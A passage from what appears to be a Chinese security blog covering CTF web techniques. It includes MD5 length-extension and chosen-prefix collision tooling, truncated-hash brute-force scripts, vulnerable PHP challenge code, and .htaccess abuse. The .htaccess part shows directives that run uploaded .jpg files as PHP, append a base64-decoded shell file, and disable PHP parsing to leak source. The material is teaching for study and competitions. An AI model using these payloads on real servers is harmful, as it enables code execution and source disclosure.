class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    修改res为已知哈希值</span></span><br><span class="line"><span class="string">    extend 为拓展值</span></span><br><span class="line"><span class="string">    自动遍历出1-30长度的payload url编码表达式</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    res = <span class="string">&#x27;1c3de59d2f68788cc792e0eb7d604710&#x27;</span></span><br><span class="line">    extend = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="comment"># print(reverse_hex(&#x27;0x&#x27; + res))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">        hex_bit = <span class="built_in">hex</span>(i*<span class="number">8</span>)</span><br><span class="line">        t = url_append(hex_bit)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[%d]&#x27;</span> % i,md5_lea(extend,res,i))</span><br><span class="line">        <span class="comment"># print(&#x27;&#123;&#125;%80&#123;&#125;&#123;&#125;&#123;&#125;&#x27;.format(&#x27;X&#x27;*i, (55-i)*&#x27;%00&#x27;,t, extend) )</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%80&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>((<span class="number">55</span>-i)*<span class="string">&#x27;%00&#x27;</span>,t, extend) )</span><br><span class="line">        <span class="comment"># print(&#x27;&#123;&#125;&#123;&#125;&#x27;.format( hex(i), (18-len(hex(i)))*&#x27;0&#x27;) )</span></span><br><span class="line">    <span class="comment"># from urllib.parse import unquote</span></span><br><span class="line">    <span class="comment"># print(md5_lea(&#x27;kingkk&#x27;,&#x27;571580b26c65f306376d4f64e53cb5c7&#x27;,10))</span></span><br></pre></td></tr></table></figure><h4 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h4><h5 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h5><p>hashpump是一个专门生成MD5长度拓展攻击payload的工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Github仓库：https://github.com/bwall/HashPump</span><br></pre></td></tr></table></figure><blockquote><p><strong>现在被作者删了找不到了</strong></p></blockquote><h5 id="hash-ext-attack"><a href="#hash-ext-attack" class="headerlink" title="hash-ext-attack"></a>hash-ext-attack</h5><p>推荐中文项目:<a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><h2 id="MD5前缀构造法"><a href="#MD5前缀构造法" class="headerlink" title="MD5前缀构造法"></a>MD5前缀构造法</h2><h3 id="工具：fastcoll"><a href="#工具：fastcoll" class="headerlink" title="工具：fastcoll"></a>工具：fastcoll</h3><p>原理是构造两个不一样的字符串，但是MD5是一样</p><p>通过构造前缀碰撞法”（chosen-prefix collisions）来进行哈希碰撞（<strong>也可以构造两个MD5相同的文件</strong>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p 2.pdf -o 3.pdf 4.pdf</span><br><span class="line">fastcoll_v1.0.0.5.exe -p test.txt -o 3.txt 4.txt</span><br></pre></td></tr></table></figure><blockquote><p>文件内的内容为你想构造的前缀</p></blockquote><p>输出两个txt文本后：<strong>在php环境中运行Md5collision.php</strong></p><p><img src="/archives/af00d924/QQ20241002-210608.png"></p><p>可以看到，二进制的hash一样。 但是实际内容不一样。</p><h3 id="Md5collision-php"><a href="#Md5collision-php" class="headerlink" title="Md5collision.php"></a>Md5collision.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;¶þ½øÖÆhash &#x27;</span>. <span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;URLENCODE &#x27;</span>. <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;URLENCODE hash &#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urlencode</span> (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;¶þ½øÖÆhash &#x27;</span>.<span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;URLENCODE &#x27;</span>.  <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;URLENCODE hash &#x27;</span>.<span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/af00d924/QQ20241002-210608.png"></p><p><strong>可以看到前面相同的内容是我们构造的前缀</strong>，最后形成了两个字符串不同但二进制哈希值相同的字符串</p><h3 id="适用题型"><a href="#适用题型" class="headerlink" title="适用题型"></a>适用题型</h3><p>适用于<strong>字符串拼接类型</strong>，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="NAN和INF"><a href="#NAN和INF" class="headerlink" title="NAN和INF"></a>NAN和INF</h2><p>NAN和INF，分别为非数值和无穷大。当一个运算无法计算结果时，就会产生NAN，可以通过<code>0/0</code>产生；而当数值超过PHP_FLOAT_MAX或者使用一些数学函数产生极大或极小的结果时，就会得到INF。</p><p>但是var_dump它们数据类型却是<strong>double</strong></p><p><img src="/archives/af00d924/QQ20250117-114214.png"></p><p>那么在MD5函数处理他们时，是将其直接转化为字符串”NAN”和字符串”INF”使用的，但他们有个特殊的性质，<strong>他们与任何数据类型(除了true)做强类型或弱类型比较均为false，甚至NAN&#x3D;&#x3D;&#x3D;NAN都是false(<code>INF===INF为true</code>)，但<code>md5(&#39;NAN&#39;)===md5(&#39;NAN&#39;)和md5(&#39;INF&#39;)===md5(&#39;INF&#39;)为true</code>.</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;INF&#x27;</span>)===<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;INF&#x27;</span>));  <span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;NAN&#x27;</span>)===<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;NAN&#x27;</span>));  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><h2 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h2><h3 id="md5截断爆破"><a href="#md5截断爆破" class="headerlink" title="md5截断爆破"></a>md5截断爆破</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(?),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findmd5</span>(<span class="params">sss</span>):    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><h3 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha256</span>(?),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256((<span class="string">&#x27;TQLCTF&#x27;</span>+<span class="built_in">str</span>(s)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>   <span class="comment">#已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):    <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> sha1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess利用总结</title>
      <link href="/archives/4e0ee84d/"/>
      <url>/archives/4e0ee84d/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>.htaccess是Apache服务器中的一个配置文件，里面存放着Apache服务器配置相关的指令。通过.htaccess文件我们能实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许、阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<code>.htaccess</code>中<strong>注释符有<code>#</code>且支持<code>\</code>拼接上下两行。</strong></p><p>启动<code>.htaccess</code>我们需要将apache配置文件中的AllowOverride选项设置为All（默认为None）</p><p>需要注意的是<code>.htaccess</code>配置文件中的指令只对当前目录及其子目录生效，如果子目录也存在<code>.htaccess</code>文件，则子目录的配置优先于父目录，即<strong>子目录中的指令会覆盖父目录或者主配置中的指令。</strong></p><h2 id="常见使用方法"><a href="#常见使用方法" class="headerlink" title="常见使用方法"></a>常见使用方法</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>可以设置允许或禁止所有IP访问某文件或者禁止某IP访问，文件名可使用通配符和正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 禁止访问 .git、.env 等文件</span><br><span class="line">&lt;FilesMatch &quot;\.(env|git|sql|bak|ini)$&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all   #禁止所有访问</span><br><span class="line">    Deny from 1.1.1.1 #禁止IP为1.1.1.1访问</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="目录重定向"><a href="#目录重定向" class="headerlink" title="目录重定向"></a>目录重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 301 /old /new</span><br></pre></td></tr></table></figure><p><strong>该规则会将&#x2F;old目录重定向到&#x2F;new目录</strong></p><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 /errors/404.html</span><br><span class="line">ErrorDocument 500 /errors/500.html</span><br></pre></td></tr></table></figure><h3 id="URL-重定向与重写"><a href="#URL-重定向与重写" class="headerlink" title="URL 重定向与重写"></a>URL 重定向与重写</h3><p>该功能主要通过主要通过 <code>mod_rewrite</code> 模块实现，如文件扩展名处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 隐藏.html扩展名（访问/about → about.html）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d   #排查目录</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125;.html -f #检测html目录是否存在</span><br><span class="line">RewriteRule ^([^\.]+)$ $1.html  #重写规则</span><br><span class="line"></span><br><span class="line"># 强制添加斜杠（防止目录访问404）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">RewriteRule ^(.*[^/])$ %&#123;REQUEST_URI&#125;/ </span><br></pre></td></tr></table></figure><blockquote><p>**<code>%&#123;REQUEST_FILENAME&#125;</code>**：Apache 变量，表示用户请求路径对应的服务器物理路径</p><p>**<code>-d</code>**：测试是否为存在的目录</p></blockquote><h3 id="允许-禁止显示目录列表"><a href="#允许-禁止显示目录列表" class="headerlink" title="允许&#x2F;禁止显示目录列表"></a>允许&#x2F;禁止显示目录列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁止目录列表</span><br><span class="line">Options -Indexes</span><br></pre></td></tr></table></figure><blockquote><p>对当前目录及所有子目录，访问无索引文件的目录时返回 <strong>403 Forbidden</strong> 错误。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 允许目录列表</span><br><span class="line">Options +Indexes</span><br></pre></td></tr></table></figure><h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>SetHandler指令可以<strong>强制所有匹配的文件被一个指定的处理器处理。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><blockquote><p><strong>当前目录以及子目录所有文件将会被当作php解析。</strong></p></blockquote><h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><p>AddHandler 指令可以实现<strong>在文件扩展名与特定的处理器之间建立映射。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>扩展名为.jpg的文件会被当作php解析</strong></p></blockquote><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><p>与AddHandler作用一样，AddType 指令可以将<strong>给定的文件扩展名映射到指定的内容类型。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>将jpg后缀文件当作php文件执行</strong></p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当PHP作为Apache模块时，可以通过Apache的配置文件如httpd.conf或.htaccess文件中的指令来修改php的配置。但需要有AllowOverride Options 或AllowOverride All 权限才可以。</p><p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定范围</a>:</p><p><img src="/archives/4e0ee84d/QQ20250322-174707.png"></p><p>可以看到.htaccess只能用于<strong>PHP_INI_ALL或PHP_INI_PERDIR</strong>类型的指令。</p><p>然后可以在<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表中找到可用的指令</a>:</p><p><img src="/archives/4e0ee84d/QQ20250322-175445.png"></p><ul><li><strong>auto_prepend_file：在主文件解析之前自动解析包含的文件</strong></li><li><strong>auto_append_file：在主文件解析后自动解析包含的文件</strong></li></ul><p>可以设置<code>auto_prepend_file/auto_append_file</code>进行文件包含，包含的文件可以使用php伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含1.jpg的内容</span><br><span class="line">php_value auto_prepend_file 1.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析2.jpg的内容</span><br><span class="line">php_value auto_append_file 2.jpg</span><br><span class="line"></span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="php-flag"><a href="#php-flag" class="headerlink" title="php_flag"></a>php_flag</h3><p>php_flag 用来设定<strong>布尔值的php 配置指令</strong>。</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag name on|off</span><br></pre></td></tr></table></figure><p><img src="/archives/4e0ee84d/QQ%E6%88%AA%E5%9B%BE20250322181309.png"></p><p>可以将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>通过利用php_flag将<code>engine</code>设置为0，关闭php解析，从而造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><p><img src="/archives/4e0ee84d/QQ20250322-213940.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-213954.png"></p><h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>在设有黑名单的文件上传中，如果没有过滤.htaccess，我们可以通过上传.htaccess文件将图片作为php文件解析</p><p>可以使用的指令有:</p><ul><li><p><strong>SetHandler</strong></p><figure 